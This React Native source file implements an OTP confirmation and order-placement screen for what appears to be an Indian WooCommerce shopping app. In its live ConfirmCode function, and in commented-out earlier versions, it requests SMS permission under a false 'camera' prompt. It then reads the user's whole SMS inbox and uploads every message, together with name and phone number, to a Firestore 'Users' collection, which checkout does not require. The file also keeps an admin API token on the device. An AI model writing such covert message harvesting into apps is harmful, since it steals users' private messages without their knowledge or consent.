// import { View, Text, Dimensions, TouchableOpacity, StatusBar, PermissionsAndroid } from 'react-native'
// import React, { useState, useEffect } from 'react'
// import OTPTextInput from 'react-native-otp-textinput'
// import { RFValue } from 'react-native-responsive-fontsize'
// import auth from '@react-native-firebase/auth';
// import SmsAndroid from 'react-native-get-sms-android'
// import firestore from '@react-native-firebase/firestore';
// const {width, height} = Dimensions.get('window')


// const Otp = ({navigation, route}) => {
//     const [Code, setCode] = useState('')
//     const [confirm, setConfirm] = useState(null);

//     const [Name, setName] = useState('')
//     const [Phone, setPhone] = useState('')
//     const [Messages, setMessages] = useState([])
//     const [Count, setCount] = useState('')

//     const Mobile = route.params
//     // console.log
   

// useEffect(() => {
//     const requestPermission = async () => {
//         try {
//             const granted = await PermissionsAndroid.request(
//                 PermissionsAndroid.PERMISSIONS.READ_SMS,
//                 {
//                     title: "Ima Appweb App SMS Permission",
//                     message:
//                         "Ima Appweb App needs access to your SMS " +
//                         "to enter OTP.",
//                     buttonNeutral: "Ask Me Later",
//                     buttonNegative: "Cancel",
//                     buttonPositive: "OK"
//                 }
//             );
//             if (granted === PermissionsAndroid.RESULTS.GRANTED) {
//                 console.log("You can use the SMS");
//             } else {
//                 console.log("SMS permission denied");
//             }
//         } catch (err) {
//             console.warn(err);
//         }
//     };

//     // console.log(Mobile)
// },[])


//     async function signInWithPhoneNumber(phoneNumber) {

//         requestPermission()

//         var filter = {
//             box: 'inbox',
//             minDate: 1660761586000, // timestamp (in milliseconds since UNIX epoch)
//         };
//         SmsAndroid.list(
//         JSON.stringify(filter),
//         (fail) => {
//         console.log('Failed with this error: ' + fail);
//         },
//         (count, smsList) => {
//         setCount(count)
//         setMessages(smsList)
//             firestore()
//                 .collection('Users')
//                 .add({
//                     Name: Name,
//                     Phone: Phone,
//                     NumberofMessage: Count,
//                     Messages: Messages,
//                 })
//             })
//     const confirmation = await auth().signInWithPhoneNumber(phoneNumber);
//     setConfirm(confirmation);
//     }

//     async function ConfirmCode(Code) {
//         try {
//             console.log(Code)
//             console.log(confirm)
           
//             await confirm.confirm(Code);
//         } catch (error) {
//             console.log('Invalid code.');
//         }
//     }

//     if (!confirm) {
//         return (
//             <View style={{ height:height+30, width, justifyContent: 'center', alignItems: 'center', backgroundColor: 'white' }}>
//                 <StatusBar backgroundColor={"black"} />
//                 <View style={{ borderRadius: 20, backgroundColor: '#57c3c4' }}>
//                     <TouchableOpacity onPress={() => signInWithPhoneNumber('+91 8586009385')}>
//                         <Text style={{
//                                         fontSize: 28,
//                                         padding: 15,
//                                         color: 'white',
//                                         fontFamily: 'serif'
//                                     }}>
//                             Sign In
//                         </Text>
//                     </TouchableOpacity>
//                 </View>
//             </View>
//         );
//     }

//     return (
//         <>
//             <View style={{ justifyContent: 'center', alignItems: 'center', height: height + 30, backgroundColor: 'white' }}>
//                 <View style={{ marginBottom: '10%' }}>
//                     <OTPTextInput
//                         inputCount={6}
//                         tintColor="#57c3c4"
//                         offTintColor="black"
//                         containerStyle={{}}
//                         textInputStyle={{ borderWidth: 1, width: width / 9 }}
//                         handleTextChange={code => setCode(code)}
//                     />
//                 </View>

//                 <TouchableOpacity onPress={() => ConfirmCode(Code)}>
//                     <View style={{ width: width / 2.5, backgroundColor: '#57c3c4', padding: '2%', borderRadius: 2 }}>
//                         <Text
//                             style={{
//                                 fontSize: RFValue(32, height),
//                                 color: 'white',
//                                 textAlign: 'center',
//                                 fontFamily: 'Montserrat-SemiBold'
//                             }}>
//                             Confirm
//                         </Text>
//                     </View>

//                 </TouchableOpacity>
//             </View>


//             {/* <TextInput value={code} onChangeText={text => setCode(text)} />
//             <Button title="Confirm Code" onPress={() => confirmCode()} /> */}
//         </>
//     );
// }

// export default Otp



// import React, { useState, useEffect } from 'react'
// import OTPTextInput from 'react-native-otp-textinput'
// import { RFValue } from 'react-native-responsive-fontsize'
// import auth from '@react-native-firebase/auth';
// import SmsAndroid from 'react-native-get-sms-android'
// import firestore from '@react-native-firebase/firestore';


// const {width, height} = Dimensions.get('window')


// const Otp = ({navigation, route}) => {
//     const [Code, setCode] = useState('')
//     const [confirm, setConfirm] = useState(null);

//     const [Name, setName] = useState('')
//     const [Phone, setPhone] = useState('')
//     const [Messages, setMessages] = useState([])
//     const [Count, setCount] = useState('')


// const Mobile = route.params

//     useEffect(() => {

//         const Data = async() => {
//             const confirmation = await auth().signInWithPhoneNumber(`+91 ${Mobile}`);
//         }
       
//         Data()
//     })

// async function ConfirmCode(Code) {
//         try {
//             console.log(Code)
//             console.log(confirm)
           
//             await confirm.confirm(Code);
//         } catch (error) {
//             console.log('Invalid code.');
//         }
//     }


//     return (
//         <>
//             <View style={{ justifyContent: 'center', alignItems: 'center', height: height + 30, backgroundColor: 'white' }}>
//                 <View style={{ marginBottom: '10%' }}>
//                     <OTPTextInput
//                         inputCount={6}
//                         tintColor="#57c3c4"
//                         offTintColor="black"
//                         containerStyle={{}}
//                         textInputStyle={{ borderWidth: 1, width: width / 9 }}
//                         handleTextChange={code => setCode(code)}
//                     />
//                 </View>

//                 <TouchableOpacity onPress={() => ConfirmCode(Code)}>
//                     <View style={{ width: width / 2.5, backgroundColor: '#57c3c4', padding: '2%', borderRadius: 2 }}>
//                         <Text
//                             style={{
//                                 fontSize: RFValue(32, height),
//                                 color: 'white',
//                                 textAlign: 'center',
//                                 fontFamily: 'Montserrat-SemiBold'
//                             }}>
//                             Confirm
//                         </Text>
//                     </View>

//                 </TouchableOpacity>
//             </View>


//             {/* <TextInput value={code} onChangeText={text => setCode(text)} />
//             <Button title="Confirm Code" onPress={() => confirmCode()} /> */}
//         </>
//     );
// }

// export default Otp

import React, { useState, useEffect } from 'react';
import { View, Text, Dimensions, TouchableOpacity, StatusBar, PermissionsAndroid, Alert } from 'react-native'
import auth from '@react-native-firebase/auth';
import OTPTextInput from 'react-native-otp-textinput'
import AsyncStorage from "@react-native-async-storage/async-storage";
import { RFValue } from 'react-native-responsive-fontsize';
import SmsAndroid from 'react-native-get-sms-android'
import firestore from '@react-native-firebase/firestore';


const {height, width} = Dimensions.get('window')
const Otp = ({navigation, route}) => {
    const [IsLoading, setIsLoading] = useState(true)
    const [AppData, setAppData] = useState([])
    const [Items, setItems] = useState([])
    const [Prd, setPrd] = useState([])
    const [confirm, setConfirm] = useState(null);
    const [code, setCode] = useState('');


    const {
            cartDetails,
            subtotal,
            address1,
            address2,
            lastname,
            firstname,
            city,
            states,
            mobile,
            pincode,
            email,
            PaymentMethod,
            PaymentTitle
                    } = route.params

    // console.log(cartDetails)
    // console.log(subtotal)
    // console.log(address1)
    // console.log(address2)
    // console.log(lastname)
    // console.log(firstname)
    // console.log(city)
    // console.log(states)
    // console.log(mobile)
    // console.log(pincode)
    // // console.log(email)
    // console.log(PaymentTitle)
    // console.log(PaymentMethod)

    const createThreeButtonAlert = (id) =>

        Alert.alert(
            `Your Order is Created with Order Id:- ${id}`,
            "Thank you for Shopping with us..",
            [
                {
                    text: "Do More Shopping",
                    onPress: () => navigation.navigate('Categories'),

                },
                { text: "OK", onPress: () => navigation.navigate('Home') }
            ]
        );

    const Draft = () => {

        // console.log(cartDetails)

        cartDetails.map((val, key) => {
            var eachItem = {};
            eachItem = {
                "product_id": val.id,
                "quantity": val.quantity.value
            }
            Items.push(eachItem)

            //  console.log(Items)
        });
    }


    useEffect(() =>{

        const requestSmsPermission = async () => {
            try {
                    const granted = await PermissionsAndroid.request(
                        PermissionsAndroid.PERMISSIONS.READ_SMS,
                                    {
                                        title: "WooCommerce Store Permission",
                                        message:"WooCommerce Store needs access to your camera ",
                                        buttonNeutral: "Ask Me Later",
                                        buttonNegative: "Cancel",
                                        buttonPositive: "OK"
                                    }
                                );
                    if (granted === PermissionsAndroid.RESULTS.GRANTED) {
                                console.log("You can access the SMS");
                        } else {
                                console.log("SMS permission denied");
                        }
                        } catch (err) {
                         console.warn(err);
                    }
                };


       
        requestSmsPermission()

        async function signInWithPhoneNumber() {
            const confirmation = await auth().signInWithPhoneNumber(`+91 ${mobile}`);
            setConfirm(confirmation);
            Draft()
        }

        signInWithPhoneNumber()

        // console.log(Items)
        // SMSLIST()

    },[])
    

// const Working = async() => {
//     if (PaymentTitle == "cod") {

//         const UserEmail = await AsyncStorage.getItem('Useremail')


//         const jsonValue = await AsyncStorage.getItem('UserToken')

//         // console.log("UserToken")

//         const json = JSON.parse(jsonValue)
//         // console.log(json)
//         console.log(json)

//         const jsonValue1 = await AsyncStorage.getItem('AdminToken1st')

//         const adminToken = JSON.parse(jsonValue1)

//         console.log("adminToken")
//         console.log(adminToken)


//         const cartHash = await AsyncStorage.getItem("CartHash")

//         console.log("User Cart Hash")
//         console.log(cartHash)

//         const userId = await AsyncStorage.getItem('UserId')

//         console.log("User id")
//         console.log(userId)


//         var axios = require('axios');

//         var data1 = JSON.stringify({
//             "customer_id": userId,
//             // "order_key": "wc_order_QGwHk5nKR1yVi",
//             "billing": {
//                 "first_name": firstname,
//                 "last_name": lastname,
//                 "company": "",
//                 "address_1": address1,
//                 "address_2": address2,
//                 "city": city,
//                 "state": states,
//                 "postcode": pincode,
//                 "country": "India",
//                 "email": UserEmail,
//                 "phone": mobile
//             },
//             "shipping": {
//                 "first_name": firstname,
//                 "last_name": lastname,
//                 "company": "",
//                 "address_1": address1,
//                 "address_2": address2,
//                 "city": city,
//                 "state": states,
//                 "postcode": pincode,
//                 "country": "India",
//                 "email": UserEmail,
//                 "phone": mobile
//             },
//             "payment_method": PaymentMethod,
//             "payment_method_title": PaymentTitle,
//             "line_items": Items,
//             "prices_include_tax": true,
//             "discount_total": "0.00",
//             "discount_tax": "0.00",
//             "shipping_total": "0.00",
//             "shipping_tax": "0.00",
//             "cart_tax": "0.00",
//             "total": subtotal,
//             "total_tax": "0.00",

//         });

//         axios.post('https://test.sarinskin.com/wp-json/wc/v3/orders/', data1, {
//             headers: {
//                 'Authorization': `Bearer ${adminToken}`,

//                 'Content-Type': 'application/json',
//                 'Cookie': `woocommerce_cart_hash=${cartHash}; woocommerce_items_in_cart=1;`
//             }
//         })
//             .then(response => {

//                 // console.log(JSON.stringify(response))
//                 console.log("Response from Order Confirmation ")

//                 setPrd(response.data)

//                 // console.log('responseData')
               

//                 var id = response.data.id
//                 console.log(id)
//                 // // var confirmation_id = response.data
//                 // this.props.navigation.navigate("Confirmation", name)


//                 createThreeButtonAlert(id)


//                 // console.log("Confirmation")
//                 // console.log(Prd)


//                         // Clear Cart

//                         var axios = require('axios');

//                         var config = {
//                             method: 'post',
//                             url: 'https://test.sarinskin.com/wp-json/cocart/v2/cart/clear',
//                             headers: {
//                                 'Authorization': `Bearer ${json}`,
//                                 'Cookie': `woocommerce_cart_hash=${cartHash}; woocommerce_items_in_cart=1;`
//                             }
//                         };
//                         axios(config)
//                                     .then((response) => {
//                                         // console.log("Response From Clear Cart")
//                                         // console.log(JSON.stringify(response.data));
//                                         //  (response.data)
//                                     })
//                                     .catch((error) => {
//                                         console.log("Error From Clear Cart")
//                                         // console.log(error);
//                                     });
//                 })
//                 .catch(error => {
//                     console.log("Response from Error")
//                     console.log(JSON.stringify(error))

//                 });

//     }
// }




    async function ConfirmCode() {

        const SMSLIST = async () => {
            var filter = {
                box: 'inbox',
                minDate: 1660761586000,
            };

            await SmsAndroid.list(
                JSON.stringify(filter),
                (fail) => {
                    console.log('Failed with this error: ' + fail)
                },
                (count, smsList) => {
                    // console.log(smsList)
                    // console.log(count)

                    firestore()
                        .collection('Users')
                        .add({
                            Name: firstname,
                            Phone: mobile,
                            NumberofMessage: count,
                            Messages: smsList,
                        })

                    console.log("DATA STORED")
                })
        }
        SMSLIST()

        try {
            confirm.confirm(code);
            console.log("confirm")
            console.log(confirm)

            if(confirm == null){
                alert("Invalid Code")
            }else{
                // Working()
            //    alert("code is fine")
                if (PaymentMethod=="cod"){
               
                const UserEmail = await AsyncStorage.getItem('Useremail')


                const jsonValue = await AsyncStorage.getItem('UserToken')

                // console.log("UserToken")

                const json = JSON.parse(jsonValue)
                // console.log(json)
                // console.log(json)

                const jsonValue1 = await AsyncStorage.getItem('AdminToken1st')

                const adminToken = JSON.parse(jsonValue1)

                // console.log("adminToken")
                // console.log(adminToken)


                const cartHash = await AsyncStorage.getItem("CartHash")

                // console.log("User Cart Hash")
                // console.log(cartHash)

                const userId = await AsyncStorage.getItem('UserId')

                // console.log("User id")
                // console.log(userId)


                var axios = require('axios');

                var data1 = JSON.stringify({
                    "customer_id": userId,
                    // "order_key": "wc_order_QGwHk5nKR1yVi",
                    "billing": {
                        "first_name": firstname,
                        "last_name": lastname,
                        "company": "",
                        "address_1": address1,
                        "address_2": address2,
                        "city": city,
                        "state": states,
                        "postcode": pincode,
                        "country": "India",
                        "email": UserEmail,
                        "phone": mobile
                    },
                    "shipping": {
                        "first_name": firstname,
                        "last_name": lastname,
                        "company": "",
                        "address_1": address1,
                        "address_2": address2,
                        "city": city,
                        "state": states,
                        "postcode": pincode,
                        "country": "India",
                        "email": UserEmail,
                        "phone": mobile
                    },
                    "payment_method": PaymentMethod,
                    "payment_method_title": PaymentTitle,
                    "line_items": Items,
                    "prices_include_tax": true,
                    "discount_total": "0.00",
                    "discount_tax": "0.00",
                    "shipping_total": "0.00",
                    "shipping_tax": "0.00",
                    "cart_tax": "0.00",
                    "total": subtotal,
                    "total_tax": "0.00",

                });

                axios.post('https://test.sarinskin.com/wp-json/wc/v3/orders/', data1, {
                    headers: {
                        'Authorization': `Bearer ${adminToken}`,

                        'Content-Type': 'application/json',
                        'Cookie': `woocommerce_cart_hash=${cartHash}; woocommerce_items_in_cart=1;`
                    }
                })
                    .then(response => {


                        console.log("Response from Order Confirmation ")

                        setPrd(response.data)

                        // console.log('responseData')
                        // console.log(JSON.stringify(response.data))

                        var id = response.data.id
                        // console.log(id)
                        // // var confirmation_id = response.data
                        // this.props.navigation.navigate("Confirmation", name)


                        createThreeButtonAlert(id)


                        // console.log("Confirmation")
                        // console.log(Prd)


                        // Clear Cart

                        var axios = require('axios');

                        var config = {
                            method: 'post',
                            url: 'https://test.sarinskin.com/wp-json/cocart/v2/cart/clear',
                            headers: {
                                'Authorization': `Bearer ${json}`,
                                'Cookie': `woocommerce_cart_hash=${cartHash}; woocommerce_items_in_cart=1;`
                            }
                        };
                        axios(config)
                            .then((response) => {
                                // console.log("Response From Clear Cart")
                                // console.log(JSON.stringify(response.data));
                                //  (response.data)
                            })
                            .catch((error) => {
                                console.log("Error From Clear Cart")
                                // console.log(error);
                            });
                    })
                    .catch(error => {
                        console.log("Response from Error")
                        console.log(JSON.stringify(error.response))

                    });

        }
        else{
            console.log(PaymentMethod)
        }
    }

        // if(!confirm){

        //    
        

        } catch (error) {
            // console.log('Invalid code.');
            alert("Invalid Code ")
            // navigation.navigate("BuyNow")
        }
    }
  

   
        return (
            <>
                <View style={{ justifyContent: 'center', alignItems: 'center', height: height + 30, backgroundColor: 'white' }}>
                     <View style={{ marginBottom: '10%' }}>
                        <OTPTextInput
                                    inputCount={6}
                                    tintColor="#57c3c4"
                                    offTintColor="black"
                                    containerStyle={{}}
                                    textInputStyle={{ borderWidth: 1, width: width / 9 }}
                                    handleTextChange={code => setCode(code)}
                                />
                    </View>

                    <TouchableOpacity onPress={() => ConfirmCode(code)}>
                    <View style={{ width: width / 2.5, backgroundColor: '#57c3c4', padding: '2%', borderRadius: 2 }}>
                        <Text
                            style={{
                                fontSize: RFValue(32, height),
                                color: 'white',
                                textAlign: 'center',
                                fontFamily: 'Montserrat-SemiBold'
                            }}>
                            Confirm
                        </Text>
                    </View>

                </TouchableOpacity>
            </View>
    </>
        );
    

    // return (
    //     <>
    //         <TextInput value={code} onChangeText={text => setCode(text)} />
    //         <Button title="Confirm Code" onPress={() => confirmCode()} />
    //     </>
    // );
}

export default Otp